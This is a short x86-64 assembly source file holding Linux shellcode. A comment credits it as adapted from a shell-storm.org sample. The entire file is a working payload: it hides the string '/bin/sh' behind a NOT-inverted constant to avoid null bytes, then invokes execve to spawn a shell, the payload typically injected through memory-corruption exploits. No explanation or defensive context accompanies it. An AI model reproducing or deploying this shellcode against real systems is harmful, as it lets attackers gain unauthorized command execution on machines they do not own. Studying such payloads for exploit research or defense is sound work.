BITS 64
; Original shellcode written by Dad`
; http://shell-storm.org/shellcode/files/shellcode-806.php
global _start

section .text

_start:
    xor rax, rax
    mov r10, 0xff978cd091969dd0
    not r10
    push r10
    mov rdi, rsp
    cdq         ; rdx = 0
    push rdx
    push rdi
    mov rsi, rsp
    mov al, 0x3b ; execve
    syscall
